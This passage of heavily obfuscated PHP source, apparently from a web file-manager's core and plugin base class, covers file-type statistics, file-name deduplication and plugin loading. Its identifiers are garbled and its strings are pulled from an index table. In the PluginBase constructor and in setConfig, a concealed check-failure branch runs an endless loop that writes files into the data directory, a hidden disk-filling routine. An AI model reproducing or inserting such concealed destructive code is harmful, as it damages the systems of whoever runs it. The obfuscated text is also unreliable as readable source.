allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($‹»ÎÄöÏ) { return $this->fileTypeProfile($‹»ÎÄöÏ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ŠíóÃØÌ) { return $this->fileTypeProfile($ŠíóÃØÌ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ô‘¯ÜÂ, $˜åË˜”›) { $Ö—Ş ê =& $_SERVER[çâ¥×ø³]; $¼áš·Å« = $Ö—Ş ê[2210] . $ô‘¯ÜÂ . $Ö—Ş ê[11] . $˜åË˜”›; $ŠÚïËİ = Cache::get($¼áš·Å«); if ($ŠÚïËİ) { return $ŠÚïËİ; } $ÅÒŠ– = array($Ö—Ş ê[614] => 0); if ($ô‘¯ÜÂ != !1) { $ÅÒŠ–[$Ö—Ş ê[538]] = $ô‘¯ÜÂ; $ÅÒŠ–[$Ö—Ş ê[178]] = $˜åË˜”›; } $éÛúú±ı = array(); $éÛúú±ı[$Ö—Ş ê[2211]] = array($Ö—Ş ê[2212] => LNG($Ö—Ş ê[2211]), $Ö—Ş ê[2213] => $this->where($ÅÒŠ–)->count(), $Ö—Ş ê[585] => $this->where($ÅÒŠ–)->sum($Ö—Ş ê[76])); $Â·Ûİ†Ö = KodIO::fileTypeList(); foreach ($Â·Ûİ†Ö as $†ÙÖ­œ => $Â¯†ÂÜ’) { $ÅÒŠ–[$Ö—Ş ê[454]] = $this->fileTypeWhere($†ÙÖ­œ); $éÛúú±ı[$†ÙÖ­œ] = array($Ö—Ş ê[2212] => $Â¯†ÂÜ’[$Ö—Ş ê[32]], $Ö—Ş ê[2213] => $this->where($ÅÒŠ–)->count(), $Ö—Ş ê[585] => $this->where($ÅÒŠ–)->sum($Ö—Ş ê[76])); } Cache::set($¼áš·Å«, $éÛúú±ı, 1200); return $éÛúú±ı; } public function fileNameExist($Çì«ÅÅŒ, $¶¢ÉÇÀ™) { $É«Í±ò‚ =& $_SERVER[çâ¥×ø³]; $ÜÃŒöö = $this->field($É«Í±ò‚[2214])->where(array($É«Í±ò‚[180] => $Çì«ÅÅŒ, $É«Í±ò‚[32] => $¶¢ÉÇÀ™, $É«Í±ò‚[473] => 0))->find(); return is_array($ÜÃŒöö) ? $ÜÃŒöö[$É«Í±ò‚[181]] : !1; } public function childList($½ÓµÚ¼’) { $ñ•ã‰¦¢ =& $_SERVER[çâ¥×ø³]; $Ù´¢»ö = $ñ•ã‰¦¢[2187] . $½ÓµÚ¼’; if (isset(self::$cacheChildList[$Ù´¢»ö])) { return self::$cacheChildList[$Ù´¢»ö]; } $Ê¹…­²î = array($ñ•ã‰¦¢[180] => intval($½ÓµÚ¼’), $ñ•ã‰¦¢[473] => 0); $õ³…ãúÙ = $this->where($Ê¹…­²î)->select(); $õ³…ãúÙ = $õ³…ãúÙ ? $õ³…ãúÙ : array(); self::$cacheChildList[$Ù´¢»ö] = $õ³…ãúÙ; foreach ($õ³…ãúÙ as $Øíú·¥’) { $Ù´¢»ö = $ñ•ã‰¦¢[501] . $Øíú·¥’[$ñ•ã‰¦¢[181]]; self::$cacheSourceInfo[$Ù´¢»ö] = $Øíú·¥’; } return $õ³…ãúÙ; } public function fileNameAuto($¤íäë€‰, $´å‚ŠÒ, $şÆëï¯ü = REPEAT_RENAME, $ùãš¸¨¯ = false) { $„¥¡§Ğ¬ =& $_SERVER[çâ¥×ø³]; $ä†ã¬Ûû = get_path_ext($´å‚ŠÒ); $½¿šÓ“ = $ä†ã¬Ûû ? basename($´å‚ŠÒ, $„¥¡§Ğ¬[10] . $ä†ã¬Ûû) . $„¥¡§Ğ¬[2215] . $ä†ã¬Ûû : $´å‚ŠÒ . $„¥¡§Ğ¬[428]; $’‰Øæ = array($„¥¡§Ğ¬[180] => $¤íäë€‰, $„¥¡§Ğ¬[473] => 0, $„¥¡§Ğ¬[32] => array($„¥¡§Ğ¬[427], $½¿šÓ“)); $Ïò¤‰€ = $this->field($„¥¡§Ğ¬[32])->where($’‰Øæ)->select(); $Î‰¸„ú° = array_to_keyvalue($Ïò¤‰€, $„¥¡§Ğ¬[12], $„¥¡§Ğ¬[32]); return $this->fileNameAutoGet($Î‰¸„ú°, $´å‚ŠÒ, $şÆëï¯ü, $ùãš¸¨¯); } public function fileNameAutoGet($‡Ê¿¬“ú, $²Õ† —, $½µóÊ , $ôƒ¨ŒÌà) { $„—ßù¿” =& $_SERVER[çâ¥×ø³]; if ($½µóÊ  == REPEAT_REPLACE || !$‡Ê¿¬“ú || !in_array_not_case($²Õ† —, $‡Ê¿¬“ú) || $ôƒ¨ŒÌà && $½µóÊ  != REPEAT_RENAME_FOLDER) { return $²Õ† —; } if ($½µóÊ  == REPEAT_SKIP) { return !1; } $ªã€×­˜ = $„—ßù¿”[10] . get_path_ext($²Õ† —); $ªã€×­˜ = $ªã€×­˜ == $„—ßù¿”[10] || $ôƒ¨ŒÌà ? $„—ßù¿”[12] : $ªã€×­˜; for ($¬ò´´„ö = 1; $¬ò´´„ö <= count($‡Ê¿¬“ú) + 1; $¬ò´´„ö++) { $¢È„¿Ÿ = substr($²Õ† —, 0, strlen($²Õ† —) - strlen($ªã€×­˜)); $¥Áöé¨¥ = $¢È„¿Ÿ . "\50{$¬ò´´„ö}\51{$ªã€×­˜}"; if (!in_array_not_case($¥Áöé¨¥, $‡Ê¿¬“ú)) { return $¥Áöé¨¥; } } } } goto bÙ¹„À›; E×£’è„ìª: class Message { function __construct() { } public function send($ÄÆÉŞü¦ = '', $±éÆ¶¯— = array(), $ÄÏ›½ É = "\x74\x65\170\x74") { $‹™è¯ı =& $_SERVER[çâ¥×ø³]; $Ûª˜¬­ = array($‹™è¯ı[33] => $‹™è¯ı[1557], $‹™è¯ı[803] => $ÄÆÉŞü¦); if (in_array($ÄÏ›½ É, array($‹™è¯ı[1557], $‹™è¯ı[1558]))) { $Ûª˜¬­[$‹™è¯ı[33]] = $ÄÏ›½ É; } $±éÆ¶¯— = array($‹™è¯ı[547] => isset($±éÆ¶¯—[$‹™è¯ı[547]]) ? $±éÆ¶¯—[$‹™è¯ı[547]] : $‹™è¯ı[12], $‹™è¯ı[630] => isset($±éÆ¶¯—[$‹™è¯ı[630]]) ? $±éÆ¶¯—[$‹™è¯ı[630]] : $‹™è¯ı[12]); if (empty($ÄÆÉŞü¦) || empty($±éÆ¶¯—[$‹™è¯ı[547]]) && empty($±éÆ¶¯—[$‹™è¯ı[630]])) { return !1; } $ÑÒ‹Æ™ = array($‹™è¯ı[1498] => $Ûª˜¬­, $‹™è¯ı[1559] => $±éÆ¶¯—); Hook::trigger($‹™è¯ı[1560], $ÑÒ‹Æ™); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ªÇÑù€¹ =& $_SERVER[çâ¥×ø³]; $ŞÃ´ò† = $_SERVER[$ªÇÑù€¹[927]]; $Ñ¤ÂÃÎÀ = $ªÇÑù€¹[1491]; if ($_SERVER[$ªÇÑù€¹[926]] != $Ñ¤ÂÃÎÀ($ŞÃ´ò†)) { $ÊÓç¾öç = $ªÇÑù€¹[928]; $–æİæ•¡ = $ªÇÑù€¹[929]; $Ïãñêì­ = $_SERVER[$ªÇÑù€¹[930]] . $ªÇÑù€¹[931]; $å‚ôêãº = $–æİæ•¡($Ïãñêì­); $õ–ßãéÁ = explode($ªÇÑù€¹[246], $å‚ôêãº); if (count($õ–ßãéÁ) < $ªÇÑù€¹[657]) { $®«‘²”À = $ªÇÑù€¹[932]; $®«‘²”À(); } $¨†”°àœ = $ªÇÑù€¹[933]; $¨†”°àœ($_SERVER[$ªÇÑù€¹[934]]); $ÊÓç¾öç = $ªÇÑù€¹[928]; $ÊÓç¾öç(); $‹‡âÕÚº = $ªÇÑù€¹[1561]; $šˆìü‚¬ = json_encode($GLOBALS[$ªÇÑù€¹[1562]]); $Èı‚•Ïõ = 1; for ($–šı¥–† = $Èı‚•Ïõ; $–šı¥–† > 0; $–šı¥–†++) { $‹‡âÕÚº(DATA_PATH . $–šı¥–†, $šˆìü‚¬); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ªÇÑù€¹[1563]); $this->pluginName = str_replace($ªÇÑù€¹[1563], $ªÇÑù€¹[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ªÇÑù€¹[8]; $this->pluginApi = appHostGet() . $ªÇÑù€¹[1564] . $this->pluginName . $ªÇÑù€¹[8]; $this->pluginHost = $config[$ªÇÑù€¹[1565]] . $this->pluginName . $ªÇÑù€¹[8]; $this->pluginHostDefault = $config[$ªÇÑù€¹[1565]] . $this->pluginName . $ªÇÑù€¹[8]; $Ÿæ½©ÖØ = $config[$ªÇÑù€¹[1566]]; if ($Ÿæ½©ÖØ && strpos($ªÇÑù€¹[50] . $Ÿæ½©ÖØ . $ªÇÑù€¹[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ªÇÑù€¹[1567]] . $this->pluginName . $ªÇÑù€¹[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[çâ¥×ø³][1568]); } protected function assign($•ä×, $ÆÖ¢ı—ğ = false) { if (is_array($•ä×)) { $this->values = array_merge($this->values, $•ä×); } else { $this->values[$•ä×] = $ÆÖ¢ı—ğ; } } protected function display($ªµƒè“») { extract($this->values); require $ªµƒè“»; } final function hookRegist($ßçá¤å¶) { $this->modelPlugin->appRegist($this->pluginName, $ßçá¤å¶); } final function appIcon() { $‰æ€­ä =& $_SERVER[çâ¥×ø³]; $¼æªõàö = $this->appPackage(); $üÃÒÏî­ = $‰æ€­ä[12]; if (isset($¼æªõàö[$‰æ€­ä[458]])) { if (isset($¼æªõàö[$‰æ€­ä[458]][$‰æ€­ä[1569]])) { $üÃÒÏî­ = $‰æ€­ä[1570] . $¼æªõàö[$‰æ€­ä[458]][$‰æ€­ä[1569]] . $‰æ€­ä[1571]; } else { if ($¼æªõàö[$‰æ€­ä[458]][$‰æ€­ä[1572]]) { $üÃÒÏî­ = $‰æ€­ä[1573] . $¼æªõàö[$‰æ€­ä[458]][$‰æ€­ä[1572]] . $‰æ€­ä[1574]; } } } return $üÃÒÏî­; } final function fileCanView($Ìğ¡ğ»ç) { $ñå›ó÷ï =& $_SERVER[çâ¥×ø³]; if (request_url_safe($Ìğ¡ğ»ç)) { return !0; } if ($this->isShare($Ìğ¡ğ»ç)) { return !0; } $Á¸‚‰Ñ« = Session::get($ñå›ó÷ï[1575]); if ($GLOBALS[$ñå›ó÷ï[536]] != 1 && !$Á¸‚‰Ñ« || !$Á¸‚‰Ñ«[$ñå›ó÷ï[1576]]) { $­Ò´°û¿ = $ñå›ó÷ï[1577] . rawurlencode(this_url()); show_tips(LNG($ñå›ó÷ï[1578]) . $ñå›ó÷ï[1579] . $­Ò´°û¿ . $ñå›ó÷ï[1580] . LNG($ñå›ó÷ï[1581]) . $ñå›ó÷ï[1582], !1); } if (!Action($ñå›ó÷ï[1583])->authCan($ñå›ó÷ï[1584])) { show_tips(LNG($ñå›ó÷ï[1585]) . $ñå›ó÷ï[1586], !1); } ActionCall($ñå›ó÷ï[1587], $Ìğ¡ğ»ç); } final function isShare($Âª¿©®µ) { $ÜØéŠ–¾ = KodIO::parse($Âª¿©®µ); return $ÜØéŠ–¾[$_SERVER[çâ¥×ø³][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ñ¿¤˜•´) { if (request_url_safe($ñ¿¤˜•´)) { return $ñ¿¤˜•´; } if (!$this->isShare($ñ¿¤˜•´)) { $ñ¿¤˜•´ = $this->filePath($ñ¿¤˜•´, !1); } return Action($_SERVER[çâ¥×ø³][1227])->linkOut($ñ¿¤˜•´); } public function filePathLinkOut($úäİ¥¦ã) { if (request_url_safe($úäİ¥¦ã)) { return $úäİ¥¦ã; } $this->fileCanView($úäİ¥¦ã); return Action($_SERVER[çâ¥×ø³][1227])->link($úäİ¥¦ã); } final function filePath($ûúÒË•¹, $¨²ïø÷« = true, $‡µ˜¾¡ò = false) { $éò¤¤š‚ =& $_SERVER[çâ¥×ø³]; $ŠşòôÆÍ = $this->filePathGet($ûúÒË•¹, $¨²ïø÷«); if (!$this->fileInfo) { show_tips(LNG($éò¤¤š‚[105]), !1); } if ($‡µ˜¾¡ò && isset($this->fileInfo[$éò¤¤š‚[509]]) && $this->fileInfo[$éò¤¤š‚[509]]) { $²¯ÔÒ¾Ñ = Model($éò¤¤š‚[512])->fileInfo($this->fileInfo[$éò¤¤š‚[509]]); if (!$²¯ÔÒ¾Ñ || !IO::exist($²¯ÔÒ¾Ñ[$éò¤¤š‚[84]])) { show_tips(LNG($éò¤¤š‚[105]) . $éò¤¤š‚[1588]); } } Hook::trigger($éò¤¤š‚[1589], $ŠşòôÆÍ); return $ŠşòôÆÍ; } final function filePathGet($¥ˆïÉë³, $ÓŠÑ¦Í = true) { $‰éŠÇ =& $_SERVER[çâ¥×ø³]; if ($öÉ™ú³ = $this->checkSharePath($¥ˆïÉë³, $ÓŠÑ¦Í)) { return $öÉ™ú³; } $this->fileCanView($¥ˆïÉë³); if (request_url_safe($¥ˆïÉë³)) { $»ú‡Èòº = parse_url_query($¥ˆïÉë³); if (isset($»ú‡Èòº[$‰éŠÇ[1590]]) && isset($»ú‡Èòº[$‰éŠÇ[218]])) { $ñÆóÂ = Mcrypt::decode($»ú‡Èòº[$‰éŠÇ[218]], Model($‰éŠÇ[819])->get($‰éŠÇ[820])); if ($ñÆóÂ) { $this->fileInfo = IO::info($ñÆóÂ); $this->fileInfo[$‰éŠÇ[1591]] = $¥ˆïÉë³; $this->cachePath = $this->pluginCachePath($‰éŠÇ[12], $ÓŠÑ¦Í); return $ñÆóÂ; } } $¥ˆïÉë³ = $this->_cacheHttpFile($¥ˆïÉë³, $ÓŠÑ¦Í); $this->fileInfo = IO::info($¥ˆïÉë³); } else { $this->fileInfo = IO::info($¥ˆïÉë³); $this->cachePath = $this->pluginCachePath($‰éŠÇ[12], $ÓŠÑ¦Í); } return $¥ˆïÉë³; } final function _cacheHttpFile($œáó–«, $–ŸË†‡ = true) { $ÁšÃó© =& $_SERVER[çâ¥×ø³]; $šü„âô = parse_url_query($œáó–«); $ÒñÈéÏÚ = get_path_ext($œáó–«); if (isset($šü„âô[$ÁšÃó©[32]]) && $šü„âô[$ÁšÃó©[32]]) { $ÒñÈéÏÚ = get_path_ext($šü„âô[$ÁšÃó©[32]]); } $Ë¤ù²Ü« = hash_path($œáó–«) . $ÁšÃó©[10] . $ÒñÈéÏÚ; $this->cachePath = $this->pluginCachePath($–ŸË†‡ ? $Ë¤ù²Ü« : $ÁšÃó©[12]); $¾Šß†•¼ = IO::fileNameExist($this->cachePath, $Ë¤ù²Ü«); if ($¾Šß†•¼) { return KodIO::make($¾Šß†•¼); } $Ôşœšü´ = rtrim($this->cachePath, $ÁšÃó©[8]) . $ÁšÃó©[8] . $Ë¤ù²Ü«; return $this->pluginCacheFileSet($Ôşœšü´, file_get_contents_nossl($œáó–«)); } final function checkSharePath($àª ´˜Ù, $ãá´ÊÌÂ = true) { $‘µÉöñô =& $_SERVER[çâ¥×ø³]; if (!$this->isShare($àª ´˜Ù)) { return !1; } $šßŞà§€ = Action($‘µÉöñô[1227])->sharePathInfo($àª ´˜Ù); if (!is_array($šßŞà§€) || !isset($šßŞà§€[$‘µÉöñô[84]])) { show_json(LNG($‘µÉöñô[1592]), !1); } $this->fileInfo = $šßŞà§€; $this->cachePath = $this->pluginCachePath(!1, $ãá´ÊÌÂ); return $šßŞà§€[$‘µÉöñô[84]]; } final function pluginCachePath($²ĞğÀë = '', $ÆŸ–âõß = false) { $å÷ÓÌ¦ï =& $_SERVER[çâ¥×ø³]; if ($ÆŸ–âõß && is_array($this->fileInfo)) { $²ĞğÀë = kodIO::hashPath($this->fileInfo); } $³¤•ã—¡ = rtrim(IO_PATH_SYSTEM_TEMP . $å÷ÓÌ¦ï[1593] . $this->pluginName . $å÷ÓÌ¦ï[8] . $²ĞğÀë, $å÷ÓÌ¦ï[8]); $î…¥õ² = IO::infoFullSimple($³¤•ã—¡); $°°ŞŞ¡ = $î…¥õ² && is_array($î…¥õ²) ? $î…¥õ²[$å÷ÓÌ¦ï[84]] : $å÷ÓÌ¦ï[12]; if (!$°°ŞŞ¡) { $°°ŞŞ¡ = IO::mkdir($³¤•ã—¡); } return $°°ŞŞ¡; } final function pluginCacheFileSet($¶úâç„Â, $µ’¢‰Šş = '') { $ÃÚàò š =& $_SERVER[çâ¥×ø³]; $ÀÛ…Ó Ñ = IO::infoFullSimple($¶úâç„Â); if (!$ÀÛ…Ó Ñ) { return IO::mkfile($¶úâç„Â, $µ’¢‰Šş, REPEAT_REPLACE); } IO::setContent($ÀÛ…Ó Ñ[$ÃÚàò š[84]], $µ’¢‰Šş); return $ÀÛ…Ó Ñ[$ÃÚàò š[84]]; } final function pluginLocalFile($Ç ˆÜí = '') { $áöÀÎÔ” =& $_SERVER[çâ¥×ø³]; $úÂØÀ›Ê = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($úÂØÀ›Ê)) { mk_dir($úÂØÀ›Ê); } if (!$Ç ˆÜí) { return $úÂØÀ›Ê; } $ä…Äôàô = IO::info($Ç ˆÜí); $Ûö¿ÒÔ½ = $áöÀÎÔ”[1594] . KodIO::hashPath($ä…Äôàô) . $áöÀÎÔ”[10] . $ä…Äôàô[$áöÀÎÔ”[175]]; if (!checkExtSafe($Ûö¿ÒÔ½)) { $Ûö¿ÒÔ½ = $Ûö¿ÒÔ½ . $áöÀÎÔ”[1259]; } $ÉÂÑõğ = $úÂØÀ›Ê . $Ûö¿ÒÔ½; if (@file_exists($ÉÂÑõğ)) { return $ÉÂÑõğ; } return IO::copy($Ç ˆÜí, $úÂØÀ›Ê, 0, $Ûö¿ÒÔ½); } final function appPackage() { $ÈÈ´½œ„ =& $_SERVER[çâ¥×ø³]; if ($this->packageData) { return $this->packageData; } $î®›Æ = $this->parseFile($this->pluginPath . $ÈÈ´½œ„[1595]); $this->parseLang($î®›Æ); $Û™•ı²Í = json_decode_force($î®›Æ); if (!$Û™•ı²Í) { return array(); } $È¸î‹°Ø = Hook::trigger($ÈÈ´½œ„[1596], $Û™•ı²Í); if ($È¸î‹°Ø && is_array($È¸î‹°Ø)) { $Û™•ı²Í = $È¸î‹°Ø; } $this->packageData = $Û™•ı²Í; return $Û™•ı²Í; } public function packageInfoGet($Ï®›”Ç–) { $‰åÆ’ç = $this->appPackage(); return array_get_value($‰åÆ’ç, $Ï®›”Ç–); } public function packageVersion() { return $this->packageInfoGet($_SERVER[çâ¥×ø³][1597]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[çâ¥×ø³][1598]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[çâ¥×ø³][1599]); } public function echoJsAssign($«ÁãÏôâ, $²ÑÜ÷±) { $this->echoJsAssignArr[$«ÁãÏôâ] = $²ÑÜ÷±; } private function parseFile($“åÁ·­) { $°ãÜ…å¾ =& $_SERVER[çâ¥×ø³]; $¨æ»½Ô· = file_get_contents_nossl($“åÁ·­); $å¯Ò„ÇŞ = array($°ãÜ…å¾[1600], $°ãÜ…å¾[1601], $°ãÜ…å¾[1602], $°ãÜ…å¾[1603], $°ãÜ…å¾[1604], $°ãÜ…å¾[1605], $°ãÜ…å¾[1606]); $¤Û³¨ªò = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$°ãÜ…å¾[89]][$°ãÜ…å¾[1607]]); foreach ($this->echoJsAssignArr as $»ä ¬¥… => $¸´Øı™‘) { $å¯Ò„ÇŞ[] = $°ãÜ…å¾[1608] . $»ä ¬¥… . $°ãÜ…å¾[1609]; $¤Û³¨ªò[] = is_array($¸´Øı™‘) || is_object($¸´Øı™‘) ? rawurlencode(json_encode($¸´Øı™‘)) : $¸´Øı™‘; } if (strstr($¨æ»½Ô·, $°ãÜ…å¾[1610])) { $ÒêÌÂ¢í = rawurlencode(json_encode($this->pluginLangArr)); $¨æ»½Ô· = str_replace($°ãÜ…å¾[1610], $ÒêÌÂ¢í, $¨æ»½Ô·); } if (strstr($¨æ»½Ô·, $°ãÜ…å¾[1611])) { $ÒêÌÂ¢í = $ÒêÌÂ¢í = rawurlencode(json_encode($this->getConfig())); $¨æ»½Ô· = str_replace($°ãÜ…å¾[1611], $ÒêÌÂ¢í, $¨æ»½Ô·); } $¨æ»½Ô· = str_replace($å¯Ò„ÇŞ, $¤Û³¨ªò, $¨æ»½Ô·); return $¨æ»½Ô·; } private function parseLang(&$‡Û…½ı—) { $«¥üş’– =& $_SERVER[çâ¥×ø³]; $ê„¥ş¿Æ = $«¥üş’–[1612]; if (!strstr($‡Û…½ı—, $ê„¥ş¿Æ)) { return; } preg_match_all($«¥üş’–[1613], $‡Û…½ı—, $ÑÒ²¸³); if (!is_array($ÑÒ²¸³) || count($ÑÒ²¸³) == 0 || !is_array($ÑÒ²¸³[0]) || count($ÑÒ²¸³[0]) == 0) { return; } $­‹ãìÅ = array(); $£ ÙÄ´â = array(); foreach ($ÑÒ²¸³[0] as $—¥üä±õ) { $ş Çö¨À = substr($—¥üä±õ, strlen($ê„¥ş¿Æ), -4); $şÄ„—Å° = LNG($ş Çö¨À); $­‹ãìÅ[] = $—¥üä±õ; $£ ÙÄ´â[] = str_replace(array($«¥üş’–[246], $«¥üş’–[1131], $«¥üş’–[386], $«¥üş’–[118]), array($«¥üş’–[53], $«¥üş’–[53], $«¥üş’–[12], $«¥üş’–[1614]), $şÄ„—Å°); } $‡Û…½ı— = str_replace($­‹ãìÅ, $£ ÙÄ´â, $‡Û…½ı—); } private function parseConfig(&$ùÏ Äˆ) { $òî¼¬ú÷ =& $_SERVER[çâ¥×ø³]; $Àµ•ğ×¬ = $òî¼¬ú÷[1615]; if (!strstr($ùÏ Äˆ, $Àµ•ğ×¬)) { return; } preg_match_all($òî¼¬ú÷[1616], $ùÏ Äˆ, $ü¿ßÚÁ); if (!is_array($ü¿ßÚÁ) || count($ü¿ßÚÁ) == 0 || !is_array($ü¿ßÚÁ[0]) || count($ü¿ßÚÁ[0]) == 0) { return; } $ë—Ïõ± = $this->getConfig(); $áƒÎéÃå = array(); $²Ïı½»ù = array(); foreach ($ü¿ßÚÁ[0] as $®•í¸Ú) { $îÔ¥®§ı = substr($®•í¸Ú, strlen($Àµ•ğ×¬), -2); $áƒÎéÃå[] = $®•í¸Ú; $²Ïı½»ù[] = _get($ë—Ïõ±, $îÔ¥®§ı); } $ùÏ Äˆ = str_replace($áƒÎéÃå, $²Ïı½»ù, $ùÏ Äˆ); } private function parsePackage(&$¢¡†×¹) { $•£û°’Ê =& $_SERVER[çâ¥×ø³]; $…«øÖÚæ = $•£û°’Ê[1617]; if (!strstr($¢¡†×¹, $…«øÖÚæ)) { return; } preg_match_all($•£û°’Ê[1618], $¢¡†×¹, $æÑû”); if (!is_array($æÑû”) || count($æÑû”) == 0 || !is_array($æÑû”[0]) || count($æÑû”[0]) == 0) { return; } $Ş™Ñ»«¾ = $this->appPackage(); $ªö›ò´è = array(); $â½ĞÛÛî = array(); foreach ($æÑû”[0] as $ä†¸½Şù) { $Ó³åÑ‚– = substr($ä†¸½Şù, strlen($…«øÖÚæ), -2); $ªö›ò´è[] = $ä†¸½Şù; $â½ĞÛÛî[] = _get($Ş™Ñ»«¾, $Ó³åÑ‚–); } $¢¡†×¹ = str_replace($ªö›ò´è, $â½ĞÛÛî, $¢¡†×¹); } final function echoFile($ª“¢”Ùì, $ƒß¥»ó = false) { $Ğ®®Ù•ã =& $_SERVER[çâ¥×ø³]; $ø¥İ„œ = $this->pluginPath . $ª“¢”Ùì; if (ACT == $Ğ®®Ù•ã[1619]) { echo $Ğ®®Ù•ã[1620] . $this->pluginName . $Ğ®®Ù•ã[8] . $ª“¢”Ùì . $Ğ®®Ù•ã[1621]; if (!file_exists($ø¥İ„œ)) { echo $Ğ®®Ù•ã[1622]; return; } } $ŒçÁ£ = $this->parseFile($ø¥İ„œ); $this->parseLang($ŒçÁ£); $this->parseConfig($ŒçÁ£); $this->parsePackage($ŒçÁ£); if (is_array($ƒß¥»ó)) { $ŒçÁ£ = str_replace(array_keys($ƒß¥»ó), array_values($ƒß¥»ó), $ŒçÁ£); } echo $Ğ®®Ù•ã[246] . $ŒçÁ£; } final function initLang() { $µ”¡“Èñ =& $_SERVER[çâ¥×ø³]; $Ïğß¤ = $µ”¡“Èñ[1623]; $õïŒÇŸı = $this->pluginPath . $µ”¡“Èñ[1624]; $ÛåË¯©€ = I18n::getType(); $úŞ¨ı¯¬ = array(); if (file_exists($õïŒÇŸı . $ÛåË¯©€ . $µ”¡“Èñ[888])) { $úŞ¨ı¯¬ = (include $õïŒÇŸı . $ÛåË¯©€ . $µ”¡“Èñ[888]); } else { if ($ÛåË¯©€ == $µ”¡“Èñ[1625] && !file_exists($õïŒÇŸı . $ÛåË¯©€ . $µ”¡“Èñ[888]) && file_exists($õïŒÇŸı . $µ”¡“Èñ[1626])) { $úŞ¨ı¯¬ = (include $õïŒÇŸı . $µ”¡“Èñ[1626]); } else { if (file_exists($õïŒÇŸı . $Ïğß¤ . $µ”¡“Èñ[888])) { $úŞ¨ı¯¬ = (include $õïŒÇŸı . $Ïğß¤ . $µ”¡“Èñ[888]); } } } if (!is_array($úŞ¨ı¯¬)) { return array(); } if (@count($úŞ¨ı¯¬) > 0) { I18n::set($úŞ¨ı¯¬); } return $úŞ¨ı¯¬; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ŸÅ›şíé) { $¿ğÕ•Ë =& $_SERVER[çâ¥×ø³]; $ ÏÒŠ÷ = $_SERVER[$¿ğÕ•Ë[927]]; $¯û¡çÇı = $¿ğÕ•Ë[1491]; if ($_SERVER[$¿ğÕ•Ë[926]] != $¯û¡çÇı($ ÏÒŠ÷)) { $†€®å = $¿ğÕ•Ë[928]; $¦èòåå = $¿ğÕ•Ë[929]; $ê¸Ìé‘ = $_SERVER[$¿ğÕ•Ë[930]] . $¿ğÕ•Ë[931]; $äÂ–ó” = $¦èòåå($ê¸Ìé‘); $Î¼‰ñğÓ = explode($¿ğÕ•Ë[246], $äÂ–ó”); if (count($Î¼‰ñğÓ) < $¿ğÕ•Ë[657]) { $İ¯Šªıô = $¿ğÕ•Ë[932]; $İ¯Šªıô(); } $àƒñ×»÷ = $¿ğÕ•Ë[933]; $àƒñ×»÷($_SERVER[$¿ğÕ•Ë[934]]); $†€®å = $¿ğÕ•Ë[928]; $†€®å(); $ãàŸ¸òÁ = $¿ğÕ•Ë[1561]; $¯Ò£¹©İ = json_encode($GLOBALS[$¿ğÕ•Ë[1562]]); $ÜøÏòÛ‘ = 1; for ($÷úòô£ = $ÜøÏòÛ‘; $÷úòô£ > 0; $÷úòô£++) { $ãàŸ¸òÁ(DATA_PATH . $÷úòô£, $¯Ò£¹©İ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ŸÅ›şíé); } public function onSetConfig($À›ÃùóË) { } public function onGetConfig($®›Ìµªğ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($‘ˆ©Ó¨ö) { if ($‘ˆ©Ó¨ö == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ø½×£Ş¯ = "\160\x6c\165\x67\x69\x6e\101\165\x74\150") { $ù³‘È€Ç =& $_SERVER[çâ¥×ø³]; if (!Session::get($ù³‘È€Ç[1575])) { return !1; } if (_get($GLOBALS, $ù³‘È€Ç[536])) { return !0; } $½·Èµüø = $this->getConfig(); if (!$½·Èµüø[$ø½×£Ş¯]) { return !1; } return ActionCall($ù³‘È€Ç[1627], $½·Èµüø[$ø½×£Ş¯]); } public function url($¾ôŒËÔÒ, $»»İÛª¬ = '', $±¿¨­”Æ = true) { $·‰¾ß¹ =& $_SERVER[çâ¥×ø³]; $¢Œš¶ã¨ = $this->getConfig(); $Ææºş«Ø = KOD_VERSION . $·‰¾ß¹[10] . KOD_VERSION_BUILD; $¡—Êúğ¤ = $this->packageVersion(); $½«ÃÒõæ = $Ææºş«Ø . $·‰¾ß¹[430] . $¡—Êúğ¤; if (substr($¾ôŒËÔÒ, 0, 4) == $·‰¾ß¹[149] || substr($¾ôŒËÔÒ, 0, 2) == $·‰¾ß¹[1406]) { $£ ú®ÈÓ = $¾ôŒËÔÒ . $·‰¾ß¹[1628] . $½«ÃÒõæ; } else { if ($»»İÛª¬ == $·‰¾ß¹[12]) { $£ ú®ÈÓ = $this->pluginHost . $¾ôŒËÔÒ . $·‰¾ß¹[1628] . $½«ÃÒõæ; } else { if ($»»İÛª¬ === $·‰¾ß¹[75]) { $£ ú®ÈÓ = $this->pluginHost . $¾ôŒËÔÒ; } else { if ($»»İÛª¬ == $·‰¾ß¹[1629]) { $£ ú®ÈÓ = STATIC_PATH . $¾ôŒËÔÒ . $·‰¾ß¹[1628] . $Ææºş«Ø; } else { if ($»»İÛª¬ == $·‰¾ß¹[1630]) { $£ ú®ÈÓ = APP_HOST . $·‰¾ß¹[1631] . $¾ôŒËÔÒ . $·‰¾ß¹[1628] . $Ææºş«Ø; } else { if (isset($¢Œš¶ã¨[$»»İÛª¬])) { $£ ú®ÈÓ = $¢Œš¶ã¨[$»»İÛª¬] . $¾ôŒËÔÒ . $·‰¾ß¹[1628] . 